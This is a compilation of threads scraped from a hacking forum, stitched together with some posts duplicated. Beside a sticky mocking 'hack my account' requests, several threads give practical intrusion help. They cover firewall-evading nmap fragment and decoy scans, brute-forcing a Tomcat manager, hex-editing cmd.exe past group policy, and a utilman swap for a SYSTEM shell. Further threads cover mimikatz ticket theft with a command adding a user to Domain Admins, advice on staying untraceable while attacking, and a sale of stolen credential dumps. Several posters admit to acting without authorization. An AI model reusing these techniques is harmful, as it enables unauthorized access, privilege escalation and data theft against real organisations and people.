How To Hack X Accounts   Hey there, if you're reading this chances are you've just asked a really stupid question. Chances are you made a thread asking one of these questions:   - "How can I hack Facebook accounts"  - "How can I hack GMail accounts"  - "Can you help me hack a Facebook account"  - "Can you help me hack a GMail account"   First and foremost let me say that I'm extremely happy that you've developed an interesting in Hacking and Computer Security overall. Next let me explain to you not only why your question is insulting, but also why it's a really stupid question to ask.  It's insulting  Many hackers and computer security enthusiasts have been persuing this hobby for years and have heard some form of this same question a few times a month for their entire time in this scene. Imagine answering the same question time and time again from now until you die only to be asked the same question again. Now sure, this is incredible annoying but more so, it's insulting. Not only have you not even taken the time to research your question, but you've joined our community with no intention of giving us anything before asking for something. As a community we both give and take for the betterment of everyone here and your question so early after creating an account shows only that you are here to leech off of members. No one likes leeches as they provide nothing to the community.    To make matters worse, you've taken a skillset we have been honing for months and years and sometimes decades and making it seem as easy as something anyone with no experience whatsoever can do. We've busted our asses and spent many late nights learning new skills, perfecting old skills, and sharing our insights along the way. Do you really think if it were as easy to hack accounts for massive companies as asking a random group of people on the interent, that these companies would be oblivious and not patch the security hole being exploited?  It's a really stupid question  Someone once said that there is no such thing as a stupid question. Whoever said that has never been asked the same stupid question a thousand times over. Take some time, Google around, can you find many resources on hacking Facebook or Google accounts? If you can't, don't you think that's for a reason?   But I'm glad you asked. I'm glad you are interested enough in this field that you took the first step and joined a great forum where you can build the skills necessary to start your path as a hacker and eventually be annoyed by this question too. Stick around, come hang out on IRC ( irc.evilzone.org (6697 for SSL) ), read some tutorials in the tutorial board, some eBooks in the eBooks board, hell, even just start reading random threads to start picking up bits and pieces of information.    Sure you won't learn how to hack a Facebook account, but you will learn about phishing which can be used to get credentials from a user, you will learn about programming and malware which can also be used to get credentials, you will learn about exploit development and how that can be used to gain access to a remote computer, and you will learn much more. All of these things you learn may not specifically apply to Facebook or GMail accounts but can be applied in various ways to get access to credentials which very well may get you access to an account.   Welcome to Evilzone, thanks for asking a stupid question.   x_X
Sorry to double-post but I didn't want to add this to the main post. If someone asks a stupid question, link them here. Let's try to get this stickied so we can stop answering the same stupid questions over and over again.
Good post as always x_X the community is growing in a positive light and your contributions have been upbringing. I will, be sure to link to this post as well.       Regards,Hash.
Stickied, let's reduce this 'hacking accounts' noise and focus on the important things.
Words ! 1000% agree with you x_X !
Damn, so right. Ty!
Great post, but I wouldn't say all people like that are just wanting to "leech", Some may feel they have nothing to offer because they don't really know anything when it comes to hacking, or they feel that their knowledge is so little compared to people here that they would feel its a waste of time sharing anything as they may have the idea of "Meh, everyone here will know what I have, I don't have anything to offer". I know for one that Im a newbie here and that if I was "leeching" in the beginning I would gladly  have shared things on this forum that I have learnt, once Iv gained enough skills ofc. Im sure its the same for many others (not all lol)
When u say important things what u mean ?

Kind of like wanting to learn how to swim, you don't just jump in the deep end and then cry out for help...expecting people to rush in to your aide.
try phishing or MITM attack
Great post x_X!  People don't realize that, by asking that question on the internet, white hats get to see the posts, and attempt to fix the issue in no time at all! A hacker should learn to use the brain that god gave them, and not to show the world he knows some stuff, because the world will make him know less than he thought he did!
real words , let's stop kiddie questions
TOR will anonymize you, but only if you use TOR correctly. Just because you have TOR running doesn't mean you are fully anonymous.   The student used https://guerillamail.com to send an email with a bomb threat to some Harvard officials after connecting over TOR. Guerillamail puts an X-Originating-IP header in the email source of whoever sent the mail, which in this case was a TOR exit node.  Code  To: "official@harvard.edu" <official@harvard.edu>  From: <j3nduys+gs4v8w@guerillamail.com>  Subject: Bomb threat  X-Originating-IP: [213.61.22.52]  Content-Type: text/plain; charset="utf-8"            .CodeMirror {height: auto;}      var element = document.getElementById("code-PATJbUBNUm");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });       What they then did was look at who was using TOR on the Harvard network during the time the email was sent, and they found a guy called Eldo Kim. It turns out he was one of the few people on TOR at the time. When they went and talked to Kim he admitted to it all.   This could have all been avoided if would've not used the Harvard network to send the email. If he would have sent the email using a 4G network or used some public wifi nearby he probably would have gotten away with it. Again, nothing was wrong with the TOR network -- it was simply a user opsec fail.                       Edited by pozican (Monday 17th of October 2016 06:04:50 PM)
How about VPN ? some VPN offer  anonymity , or just way to advertise their product
Quote by m12takeHow about VPN ? some VPN offer  anonymity , or just way to advertise their product   A vpn isn't able to offer the same kind of anonymity as TOR does. The ip address can always be linked back to the provider who has your billing details and connection logs. Even if you pay with bitcoin and the provider doesn't store logs, law enforcement or an attacker could monitor your traffic as it passes through the vpn and be able to see your real ip address.  It also means you can be tracked across websites because you will be using the same ip address. This can be a problem when databases get dumped. Someone could look up your ip address from various databases and link your accounts.   Tor is resilient to these problems since your exit node can be changed at any time, and in the tor browser each tab now uses a separate circuit, giving you a different ip address each time. An exit node could intercept your traffic, however your exit node will change so often this will be less of a problem.   VPNs offer the benefit that they route all traffic across them, where as tor tends to be application specific unless you are using an operating system like tails.
nope, many security companies intercept their tor exit nodes  one of them is norse  They have a web app which monitor cyber attacks around the world (http://map.norsecorp.com)  take look the website in http://www.norse-corp.com , They announced publicly that they tracked more than 2000 tor nodes

You can order VPN in some poor country. The owners there don't care about anything and won't supplie your details to 3rd parts.
If you want to be anonymous go to: https://www.privacytool.io, i run Parrot Security Os, it has everything i need and offers me a wide variety of tools that i need in my daily basis, it also comes with anonymity tools to protect you, i use Anonsurf: Its a tool made by the parrot os team and what it does, is that it sends all your internet traffic trough tor so you're fully anonymous aswell as i2p it encrypts your internet connection and gives you an option to change your identity which restarts Tor Daemon to change the exit nodes and it created a fake ip, place, and time so you can be fully anonymous actually i tried to crack my gmail account with hydra but google blocked it so it send my account a login attempt that was blocked in that log i only saw the place: Germany (NOT MY REAL PLACE), Time And Date where 1 day ahead of where i was living and it did not sent an ip log no ip showed up and that was amazing it does not send your ip if you do anything your ip is fully encrypted i went aswell to whats my ip and nothing showed up so u should 100% use this if you want to be anonymous aswell i created a custom firefox profile with plugins to spoof my ip, the os and browser and i changed some setting in about:config to be 100% anonymous while surfing  Have a great day hope it helped you!   And when you use i2p, and anonsurf u dont need a vpn or proxy so use it only like that so it sends all your traffic trough tor          Edited by That1LonelyKid (Sunday 23rd of October 2016 06:28:31 PM)

You have to ask yourself if you trust your VPN provider... Logs, backdoors and information requests made by departments like the FBI, NSA etc... You are best off checking your VPN providers privacy statement and see what it states, but even then are they going to follow that statement...   In terms of privacy from attacks it depends what you are doing, for example running a DDOS attack across Express VPN servers won't be a good idea as you will probably time out, or they will drop your connection for high traffic coming through at once. But if you are hacking a website, being protected from attacks comes down to my first point about the VPN provider and if you trust them or not...   You could add an extra layer by using Tor before connecting to a VPN in order to prevent connecting with your ISP IP address as well, but even then that method has its issues.    The VPN will hide your IP from attacks you perform, for example if you are seen to connect to a remote server from a VPN IP address you wil most likely be flagged anyway because VPN IP addresses are usually black listed for such behavior anyway; just something to think about.

Pretty much what Katheudo said, I just wanted to add that If you want to attack someones network, you don't want to be paying for that VPN with your personal credit card or paypal..  So it cant be easily traced back to you.
Quote by FullSpeedPretty much what Katheudo said, I just wanted to add that If you want to attack someones network, you don't want to be paying for that VPN with your personal credit card or paypal..  So it cant be easily traced back to you.   Yes! Something such as gift cards, bitcoin and other payment methods which are deemed to be anonymous. The VPN Private Internet Access is a great example of accepting a range of different payment methods.
It's definitely useful. Some providers don't log at all and they use shared internet protocols, therefor, it'd make it very difficult for third-parties (such as governmental entities, authorities) to track you down. In fact, if they only had your internet protocol address, it'd make it virtually impossible for the adversary to find out your true identity.   Just make sure to do a lot of research on that virtual private network provider; do they log connection logs (time-stamps specifically), usage logs, your real internet protocol, etc. Purchase the service with bitcoins, register and log in via the onion router, etc. I'd personally suggest using PrivateInternetAccess for this reason. Also use a temporary email address, and for extra security, use NSMI.   Just understand that there are a lot of variables that come into this equation. It's a complicated subject, and using a virtual private network doesn't automatically protect you, you'll need to adapt into a mentality that is capable of maintaining privacy and anonymity. Here is a very detailed guide on doing this.                       Edited by kenjoe41 (Tuesday 1st of November 2016 07:05:09 AM)

The book description says    >Become familiar with security holes in Windows, Linux, Solaris, Mac OS X, and Cisco's IOS   So I'd assume at least some of it is applicable...Perhaps you should try out some of the "same Techniques" on 64 bit Linux and see for yourself?
Quote by spike_catHi,   can i use the same Techniques (explained in the book ) on a 64 bit linux os ?    64bits on x86, ARM... ? Compared to what ?   Between 32 bits and 64 bits on x86, the first difference I can notice is that the system calls are a bit different (their number, and the way you put your arguments in registers).  Linux System Calls   To answer you, yes, you could use the same techniques but not exactly.

So, I got this idea. I could play Chess for money, and if I won, I'd earn money. But, what if I bring the ultimate Chess player to play instead of me? The computer. It will become a bot that automates the best possible moves against the player it's playing against. That way I would always win, and earn tons of money by not doing anything.   I found this Website: https://www.velocitychess.com/ which seems pretty legit to me that pays out when you reach $20 from wins, and you can cashout via Amazon Gift Cards, PayPal etc.   For a test, I would play against the computer, and play the same moves my opponent plays. Then the response I'll get from the computer, is the move I'll play against the player, and so on. If I have patience with this, I can earn some money. If I program a bot to do all this, I'll earn even more money, with less work.   So, what do you think? Would this possibly work?
Yes it could work, fairly simple to make too, it would just require a fair bit of work to rival humans, at least to the degree that you would consistently win. My recommendation is to build a bot that can beat you, then test it on the site, and continue to update the code every time you play, or at least every time you lose, to accomodate other play styles. Do this until you can win 9 games out of 10, 10 out of 10 would just be mean, and then just sit back and watch it work. Also, out of curiosity, what did you plan on programming this in?
I was planning to program this in Python. I have an idea of how it could work, with Selenium Webdriver. I'm not sure if it could work, though, like wouldn't someone have thought of this already? Wouldn't the site take measures against it?   Either way, I don't know if I should even program this, considering other players would kinda get their money robbed by an evil hacker, haha. I might program this just for fun and see how it plays against other players, though.
Well, most people don't consider chess a lucrative business, so it's not overly probable that people will think to try to cheat, especially if you need to pay to play, but it is still possible that they would implement some kind of protection against something like this. But, if you can get selenium to work, making a bot would be pretty simple, it would just be the intelligence behind it that would be a bit more difficult. And as for the morality behind it, if you don't feel comfortable using it, don't, but making it would be a good test of your skills and could be useful in the future.
You'd be making the next Deep Blue lol. Python is a good choice for this, you can probably find some libs/engines or at least some sort of implementations to ease your work
Yep, I should try it when I have time!
I wouldn't do this if I were you. Chess sites check for cheaters by testing against a large amount of different chess engines and such. Also, there are few people with higher than 2400 elo, and if you are not a GM or FM or anything like that, and no one even knows who you are, then they will just shut down your account.

Have you tried this out OP?    sounds like it could work. but i recommend testing on free sites first, once know you can generate some wins. Win about every 3 / 4 plays on the site. that way it makes you look like a normal player

Looks Pythonic, will check it out.
The only really important thing is being self sufficient. Everything else is relative to whatever is it that you want to do.  Being sure of what you want, finding material to study from and having the discipline to study is all that matters, it's at the center of any ability development, you must study and you must practice, before practice you must study.  Whatever path you take, it's unlikely that you will spend less than 6 months studying just to get out of the basics, it's not something you can rush in an afternoon, so you must be absolutely sure that you want to spend so much time on it. All else is irrelevant and subjective to your personal experience.   The only advice i can give you is that you should study the reason why things are the way they are, why do we have main(), why do we have to compile code, why do people use kali linux, why do people even use linux, etc.. If you're doing something, understand it's purpose before committing to it. Specially if you're doing any kind of work for anyone.

Quote by UntraceableShadowFirst of all  i know that the word "Hacker" is a bad term. But a lot of peapole can misinterpret me if i use other terms.   Im new in to "Hacking" and kinda familiar to c++. Otherwise im just a regular windows user and im not a linux user. Like everyone ive watching theese Kali Linux tutorials "How to hack any computer" and we all know that thats clickbait. So id really like if someone gaved me a list of whats most important to learn if you want to start hacking like 1. Programming 2. Unix. Or whatever and if you say "Programming" id really like to hear what laungeses are most important and so on. Probably 80% of the users in this community is not experienced. So i say this kindly, dont post anything on this thread if your not. Have a great day everyone. And sorry for my cringey name   What color crayons you been eating that makes you think you should create a handle like "UntraceableShadow" and out the gate ask a question like this? What shame you bring to the name that obviously does not fit you. Did you even look/lurk/browse the forum before asking?    Not going to go out of my way to search and find 5 other like questions that have been answered in every which-way under the sun.   OP asks a question and answers his own question type of question.                        Edited by 0E800 (Wednesday 26th of October 2016 07:38:50 PM)

The only advice i can give you is that you should study the reason why things are the way they are, why do we have main(), why do we have to compile code, why do people use kali linux, why do people even use linux, etc.. If you're doing something, understand it's purpose before committing to it. Specially if you're doing any kind of work for anyone.

Quote by UntraceableShadowFirst of all  i know that the word "Hacker" is a bad term. But a lot of peapole can misinterpret me if i use other terms.   Im new in to "Hacking" and kinda familiar to c++. Otherwise im just a regular windows user and im not a linux user. Like everyone ive watching theese Kali Linux tutorials "How to hack any computer" and we all know that thats clickbait. So id really like if someone gaved me a list of whats most important to learn if you want to start hacking like 1. Programming 2. Unix. Or whatever and if you say "Programming" id really like to hear what laungeses are most important and so on. Probably 80% of the users in this community is not experienced. So i say this kindly, dont post anything on this thread if your not. Have a great day everyone. And sorry for my cringey name   What color crayons you been eating that makes you think you should create a handle like "UntraceableShadow" and out the gate ask a question like this? What shame you bring to the name that obviously does not fit you. Did you even look/lurk/browse the forum before asking?    Not going to go out of my way to search and find 5 other like questions that have been answered in every which-way under the sun.   OP asks a question and answers his own question type of question.                        Edited by 0E800 (Wednesday 26th of October 2016 07:38:50 PM)

Just found this today.   If you take the base64 string   XTYEg8ZV4dtwvyiePK/zqY7APE4ycVDqeHHmvimaV4k=   and use 128-bit AES decryption with the code "Key" then you get the following ASCII string:   a6086de16e0c4476af46d773cd0342be   Of course, it's astronomically unlikely for a random decoding to yield a string that is entirely [0-9a-f], so this seems like the next step.   But what to do with a random 16-byte hex string?   I tried a few things with codon translation, given that it seems the only hint not used so far is a generic image of a bacteriophage that can easily be found on google, but the codon translation didn't end up yielding anything.
Analyzed the image? Steganography perhaps? Found the image with reverse image search. Don't have the time to look at it, but I would try comparing the image to identical images found with google and see if there are any obvious differences that could be a key or pattern. Maybe the image itself is some sort of key? The AES decrypted result is consistent with MD5 length.

Quote by ande  Identical as in THE ABSOLUTELY SAME color value? Steganography can be impossible to spot with the human eye.   Well, the image has been resized and cropped, and it's a jpg so there are compression artifacts. It's impossible for it to be exactly the same. But if resize and scale it optimally (i.e. within 1 pixel of the correct resizing) then subtraction just yields a flat  image with some high frequency noise.   You can see here: http://i.imgur.com/aqxWVBZ.png   Here I'm adjusting the brightness/contrast so we would be able to see messages written in white OR in black.   IMO it wouldn't be very realistic to be able to hide a message in that noise because the jpg artifacts would completely destroy it.   I don't know if twitter does any post-processing on the images when they're uploaded; the most likely form of steganography would probably just be edits to the file itself.

Those are just jpg artifacts; you can tell because they chunk the image into 8-pixel square regions.
Agreed. Looks like there is nothing in the image. Although it could be just a few minor bit flips in a pattern, in which case it would just look like noise. Would need the exact original image to look for that.
Quote by andeAgreed. Looks like there is nothing in the image. Although it could be just a few minor bit flips in a pattern, in which case it would just look like noise. Would need the exact original image to look for that.   It seems that the creator of the Riddle took the original image and modified it a bit (stretching, cropping etc.), so we can't really tell which of the many images online is the original.   I think we shouldn't pay much attention to the image just yet, as we've already done so on the QR-Coded one and decrypted the messages that followed and ended up on that string, which we can't identify/decrypt the hash yet. I think we should work on that.
I believe the other image is relevant as it acts like a hint,  in that a virus or dna is used to decode. Some knowledge of viruses and how virus's act like a special key when they infect a cell is probably where this challenge is headed.   OP did hint that a Non-disclosure agreement will be needed. This leads to believe OP is using some sort of biological formulas as a means of encryption and wishes to copyright the methods. This is just my guess.     Wiki Ref: QuoteAdsorption of the virion to the host cell is the key step in phage infection, which is essential for the following phage binding and injection of phage DNA . During the adsorption process, the tail fiber of phage P2 recognizes and binds to the core region of the lipopolysaccharide of E. coli, and then the phage would inject its DNA into the cytoplasm.

Or should we look at the end of the tail fiber on the image given to see if there's anything unusual we should pay attention to?

Maybe bruteforcing it with a custom wordlist that we create, from words that we have achieved from the riddle so far, such as 'key_to_success', 'key', 'Bacteriophage' etc., maybe that way we can decrypt this.

If it is a hash, it needs to crack to something useful in the next step of the puzzle... possibly a URL. I might try bruteforcing with some wordlists + TLD extensions. But it's also just a generic 16-byte string; it could be almost anything.

I'm assuming you have a restricted account on the machine. Are you only attempting to get local administrator? What is your end goal here?   If you're simply trying to run a privileged application you can look into UAC bypasses
I would bring a screw driver and open the case. Look up the motherboard model for a factory reset.   Sometimes it means pulling out the CMOS Battery or moving a jumper.

I already checked his provider network. It's the same as mine and they don't provide any TP-LINK router or modem.

It's either a honeypot or a naive person plugging a external wifi access point/router into one of the ports in the back of the cable modem (or reverse) as a way to extend his internet but not his local network.

192.169.1.1 is the ip address of the WEP AP you were able to gain access to.   Did you do a NMAP scan? Any other hosts connected to the same network as you?          Edited by 0E800 (Wednesday 19th of October 2016 11:55:06 PM)
Quote by 0E800192.169.1.1 is the ip address of the WEP AP you were able to gain access to.   Did you do a NMAP scan? Any other hosts connected to the same network as you?     There are two other hosts: 192.168.2.1 and 192.168.2.100. The first one pops up a TP-LINK message requesting a user and password to access, but the default admin doesn't work.   I already checked his provider network. It's the same as mine and they don't provide any TP-LINK router or modem. I'm sure he has a wireless modem from his provider where the router is connected to.                        Edited by pedrohemg (Thursday 20th of October 2016 01:23:32 AM)

What email service do you use? It should have a IP address recorded with it.  The IP looks like an internal IP and not a public IP.   Maybe this could help you: http://whoreadme.com/   Edit: lel, above service gives you 20 free emails. Looks like the email contains a tracking pixel.  My test email got sent to Junk folder. I said it wasn't junk and opened it from Inbox.  Antivirus block the connection. So the service could not tell if I had opened the email or not.

Thanks for reply, im using gmail, i dont have his private email i only have his business but i dont have any emails from it since he is away. I tested your suggested software and it also went to  hotmail junk, there is no way he is gona open junk in fact i dont think he is gona check business email on holiday. Is it possible that ip i got is private because he is on roaming? Im sure he was using smartphone and i know he is on roaming. How hard is to hack android? I have his whatsup and i could send him something
Location tracking is one of the most hard things nowadays. You have a simple problem with multiple solutions. Choose the right and easiest one. Tracking his location won't help you catch him because he's in another country as you mentioned. Even if it helps, First you have to make sure he's the one you're searching for before accusing him. Think about his wifi connection, his devices that he keeps at work when he goes home, devices that you can physically reach. Everything can help you prove that he did steal your computer. I hope you got the idea I'm trying to tell you.                        Edited by Boz (Tuesday 25th of October 2016 04:33:10 PM)

A.) The troposphere starts at the earth's surface, all antenna are in the troposphere.  B.) If you're even slightly off in setup, you may miss the AP entirely due to the gradual shifting over the theoretical maximum distance for a 24dbi antenna of 56km.  C.) The further away you are the more latency you're going to have, making your victim's internet crawl to a stop.    I could go on and on as to why this is a bad idea but suffice it to say that if you're going through all the trouble to do this there is really no reason why you couldn't just park outside the victim's house and do the same attack for far less cost and setup.

I'm agreeing with Phage and jyggorath. Of course there are ways to modify the data given the right circumstances, but its not as simple as just "hacking a sites database".  And obviously we are not going to give you detailed instructions on how to do it.  Research man, google is your friend! Try and understand how things like SQL works, and how sites that call data from a database are put together (ASP.NET and PHP are good starting points). Then you will know where to look for weaknesses and all the shady shit that comes with it.   Hopefully this helps and I don't sound like a condescending twat.

You don't need Visual Studio to make Python scripts. Python is a so called interpreted language, meaning it is not compiled. You can literally just write the code in a text file with any text editor, and run it as an argument to Python:  Code$ python ./script.py            .CodeMirror {height: auto;}      var element = document.getElementById("code-5v9H96bUdT");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        Or you can (in Linux at least) give the code file executable permissions and just run it directly (will need #!/usr/bin/python in the top)

hello to all,  i would like to bring up a discussion in which i would like to know the opinionsof other or experience in which they succeeded in bypassing a firewall or by passing filtred ports.  suppose i have an ip which has only https port open then how will you hack this i.p.  thanx in advance for the Answers          Edited by ande (Thursday 11th of August 2016 06:21:21 AM)
Check the webserver version, and look for vulnerabilities.
There are some popular slides from the Defcon, here   however you should try to give us more information about the firewall you want to bypass..
there is a url(can't disclose).and i am supposed to to check whether  it is vulnerable or hackers or not.through that ip,i have to check whether a hacker can breach in or not.all ports are filtred,firewall is in play.topology is unknown.
use nmap to send packets to the ip add in fagments, which bypasses the firewall. for example:   nmap 192.168.1.119 -f -sV   the switch -f breaks up the tcp header in fragments, so it can bypass IDS.
i tried but same result,filtred, and -sV its for version detection
Heres a scenario,   Lets say you spend the next 15 months trying to bypass the firewall. You successfully do, only to find out that this is a fully dedicated webserver with no core services running, only the additional port 8080 is listening. Port 8080 being the tomcat manager, which happens to be the latest stable version and has a very strong password.    What do you do now?   In my honest opinion, I wouldnt try and 'bypass' the firewall. I would work with what I have.   Attack the open port
15 Months though? xD
Roger that
@hackerz217,   For furture reference. Try to put one more minute into your writing. Your language is okay, but your use of capitalization, commas and punctuation is horrible. And I agree with trenace and jyggorath. Don't waste your time trying to find vulnerabilities in the firewall unless you know what brand and version they use. Attach what is avalible and go from there.
We have got a project to perform red team assignment against the largest bank of UAE.     EDIT: two ports are open http-80 and https-443,any help now?                       Edited by ande (Thursday 11th of August 2016 08:54:00 AM)
Quote by hackerz217two ports are open http-80 and https-443,any help now?   Please don't double post.   The fact that there is another HTTP related port (normally) open doesn't help us at all. If you do not know how to proceed after knowing there are ports open, there is a lot of basic things you need to learn.   Are there services listening on the ports? What protocol is it using? Are you able to identify what service is running? Name? Version?                       Edited by ande (Thursday 11th of August 2016 08:54:38 AM)
actually  the thing is we are not allowed to scan the url as it will be detected so i performed a stealth scan and got these two results.i just want to know whether it is possible to get access through these ports.if yes then we need to tell the client,only then we will get the project.the client is a bank.

There is no way to tell if it is possible to 'get access' through those ports unless you try. A port is not and cannot be vulnerable. The service (software) that is listening on the port is what could be vulnerable.
i will let you know t he further developements
Filter means that it's protected by a firewall. You are better off by concentrating on an open port than what is filtered. You might be able to ftp into that port. If you have done some good recon on your target, you should have a bunch of username for it.   You said "-sV is only for version detection"                  That's right, you'll need to know the versions of services running on the ports, otherwise you're fighting against yourself in order to find an exploit.   Let's say I see an open port that has the service ' pureFTP' If I search for that service in msfconsole, I'm gonna get heaps of results. However, if search for pureFTP 2.1.3 (for example) the search results will be narrowed down to a specific version. See the benefit?   Strive to know everything about ur target, not just open ports.
i agree,but you know very well that all other scans can be detected other than the stealth scan.That;'s why i did'nt perform the version detection.lets see what the client says.i will let  you know the details ASAP.  according to the mail i received SWIFT architecture is implemented and we are supposed to find flaws in it.i will fill you in the details when i will get the conformation.  thanx in advance
There are of course times when you need to move away from the stealth scan and be more 'active'. When you do so, you can still add some stealth to what you are doing. You can spoof your mac and add ip decoys. For example:   nmap 192.168.1.111 -D RND:10 --spoof-mac dell -sV -o example.xml
Quote by 2InchPunchYou might be able to ftp into that port.  FTP on port 445 and 80 sounds unlikely as they are almost always used for web. Tho I think you were using that as an example.

It is just that most stock firewalls and IDS's dont.   Tried a lazy google search for SWIFT, but I get a bunch of shit. More details?

If you spoof your IP on a target outside your network, there is no way you can see what comes back.         Edited by ande (Thursday 11th of August 2016 11:21:55 AM)
Agreed.And that's all my ceo told me,he said we are given an URL of the website of the bank and from there you have to get inside the network.i will confirm you the details by tommorow.
That's right about the spoofing. If you do use the -D switch, you can manually add the ips to spoof. But,  if those ips are not up, and yours is, it's pretty obvious who the real hacker's IP is.
Hi, I just wanted to jump in here, as I am working on something along a similar vein however; I kinda hit a wall, and I'm sure it's something and nothing!   I'm running Kali in a bid to get info from a db, nothing as sensitive as a bank but as it happens, also in the UAE.   The Server is Apache 8 with the Tomcat/Coyote JSP Engine 1.1.   I ran nmap, found an open port, that's fine. I used the tomcat_mgr_login through msf and, after bulking up the word lists, got the manager login.   I know what I really need is the admin login, which I am struggling to nail.   So, my questions are basically...   1. Is there any possibly way from the manager console for me to access the configured database, maybe deploying a war, and for the record, that one would be new to me    2. Failing a solution to 1. I believe the admin un/pw could have been set completely random, is there anything that may actually work to brute force them.   Thanks in advance for any pointers.

Hi,   Can someone please explain to me how this is not a Twitter Security Flaw? I don't think the security engineers understand what my point is...
I am with coto, unless someone tells me otherwise.  There is no mention of bruteforce in the response by twitter security team which in my opinion, they focused on the inability to easily retrieve the cookies and forgot the issue at hand.  Bet they need to revise their security policies.
Yes but he said that cookies are HTTPOnly. So, how would the cookies be hijacked? It can be hijacked, through malware but still, the cookies are encrypted.   Although they have a point, they're still vulnerable and coto has a better point. Either that guy is some lazy bastard or thinks this won't happen. Which is a wrong thing to think when it comes to security.    So, maybe explaining how it maybe possible to get the cookies over http (if it's possible) might help him recognise that they're vulnerable and they need to fix it.

This also happened with https://twitter.com/Jessewelle - where his phone got stolen and the "hacker" got access to his twitter and was able to tweet etc., but if he had discovered that security flaw, he could've found his password, try it on his other social media, completely taking over his account, change password etc.

That's easier said then done. Two, you would have to steal a cookie to accomplish this, not impossible, but you'd have to crack the encryption first. Personally I think the security guy is just being lazy, it's a valid vulnerability and they won't do anything about it
Quote by EkultekTwo, you would have to steal a cookie to accomplish this, not impossible, but you'd have to crack the encryption first.     You don't need to crack any encryption to hijack someones session by reusing their cookies. Just copy/paste the cookies into your own browser and you will be logged in as the victim for as long as the session is valid.

POC or gtfo.
Quote by H3L1X  This is only an issue if you are trying to obtain the cookie by sniffing HTTPS traffic.    That's why twitter always uses https. And you won't get anything if you sniff through http, because you and the user are already in different protocols, different ports. Plus you have to be connected to the same WiFi network (Evil Twin) to sniff. Or maybe infecting the user/victim with malware to give you the cookie files. So, it's still possible to get the cookies.                       Edited by shady (Sunday 2nd of October 2016 08:38:30 PM)

TLS uses RSA encryption, there are billions of different encryption techniques and the chances of you getting the same one is a trillion to one. You would need the authentication token, along with a plain text cookie that can be encrypted using RSA.

If I am to steal a cookie, I can then find the password of the account and takeover the account completely. Just like Twitter's Security Engineers, you have missed my point.                       Edited by NullSec (Tuesday 4th of October 2016 03:28:00 PM)
I get your point. The point of a proof of concept is actually doing it.   Create a test twitter account.  Take your cookie or auth token whatever and put it in your test environment.  Brute force your link using the cookie. You already know the password so make a password list and put your password in there.  Record it.  Document it.  Share it.   Don't test it from the same computer you created the account from.                       Edited by 0E800 (Tuesday 4th of October 2016 05:15:32 PM)
Quote by 0E800Don't test it from the same computer you created the account from.   Why not? Isn't Twitter supposed to know I am testing on a test Account that I own?
Dont test from the computer you created the account from because you need to simulate the attack in its true form.   Which is: steal the cookie, move it to a computer in a different location to perform the hack.   If you run the attack from the computer you create the account from, then its very possible Twitter will think its a legit account.  Which would make your test inaccurate.
The reason twitter is saying this isn't a very valid attack is that it is very difficult to get a remote users auth token because it is marked as HTTPOnly. With HTTPOnly you can't really steal the token with XSS/javascript and effectively what they are saying is that if you have enough access to steal the token, the user is basically screwed anyway.

With HTTPOnly you can't really steal the token with XSS/javascript and effectively what they are saying is that if you have enough access to steal the token, the user is basically screwed anyway.   Yes, you're screwed, but the "hacker" can't completely takeover the Account (without finding this flaw). After the victim's awareness of his cookie being stolen, he could reset his Password etc.   If the "hacker" finds about the flaw, and he exploits it, he can find his Account Password, and from there he can capture his Account, change his Passwords, emails etc.   So it's just implanting a second barrier if the first (cookie stealing) is violated.

Are you talking about Windows UAC? Or something completely different, we kinda need a little more content to help you here?
You can actually modify CMD.exe to run even tho the registry policy says it shouldn't. Done it myself many years back. Can't remember exactly what values you need to change, but essentially you just break a registry key name or path with a hex editor and it works.   I think this is how I did it:  - Copy cmd.exe to desktop or something  - Open in hex editor (HxD is good)  - Search for something like Software\Policies\Microsoft (Might be S o f t w a r e \ P o l i c i e s \ M i c r o s o f t)  - Change "Policies" to "Derpcies"  - Save   However why do you need it? CMD is just a shell. It just launches other applications. All of which are accessible in the windows directory and other places. I guess it can be handy if you want to run batch files tho.
iirc, that particular thing can be bypassed by writing a batch file to open cmd.    Alternatively, you can boot over windows and replace utilman with cmd and press Windows Key + U and get a NT Authority/System shell. Same thing can be done with the program for sticky keys but I forgot what it's called.
I need it to create a new user account and administrate it so I may have access to files that only administrators can access. Alternatively you could exploit and access the files through other methods but I am still learning all the in's and out's of hacking and this was the easiest of routes. The server's security is a joke and the IT team in charge of it is a little better than your average desk secretary. I have access to a guest account which I am going to admin via cmd and remove the files from the server. I am very new at this but I came bearing more knowledge then the person I was hacking to begin with so that helps.
Ok, so is this PC you are trying to break part of an active directory domain? Or are all of the accounts local to the machine? If the latter, the advice I have given you is sufficient to achieve what you want. If it is the former, unless you have been doing this for a while, you have a lot to learn about Active Directory, enterprise networks, and computer security in general. Generally, domain controllers come with the added protection of EMET, which has historically been quite difficult to bypass. Additionally, there are multi-thousand dollar boot-camps specifically for exploiting windows security because Microshit has actually stepped their game up over the last few years.   The easiest way in a domain scenario is hoping the domain admin logs into the machine you regularly use and steal their kerberos ticket to make the account you have access to a domain administrator. Easily done with mimikatz, and done even easier through meterpreter (of which has built-in modules for privilege escalation that are somewhat effective). Once you have stolen a domain admin's kerberos ticket, you can add the account you have access to into the domain admins group with the following command:   Codenet group "Domain Admins" username /add /domain            .CodeMirror {height: auto;}      var element = document.getElementById("code-Brk6sjSFLE");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        You may want to learn more about computers yourself before you start trash talking an entire IT department on a hacking forum.   SUPER EDIT:  Another method you can use to bypass the command prompt restriction is to utilize the vbs editor in the Microsoft Office suite to write vbscript that will execute shell commands of your choice. I have personally tested this on a highly secured network owned by a concerned third party that restricted command prompt through group policy and it worked flawlessly.

I'm selling a huge database with tons of data.  The data includes these databases.   Yahoo   Gmail  MSN  Hotmail   Outlook  Hackforums  Leakforums  and more   Price is $3.50
Also includes sinisterly
How old are these dumps? Hackforums, Leakforums, and a few of these other ones are already public
QuotePrice is $3.50  god damn it.

You can install kali as virtual machine, or on hdd,  but i doubt you would be able to do that without help judging from your question.

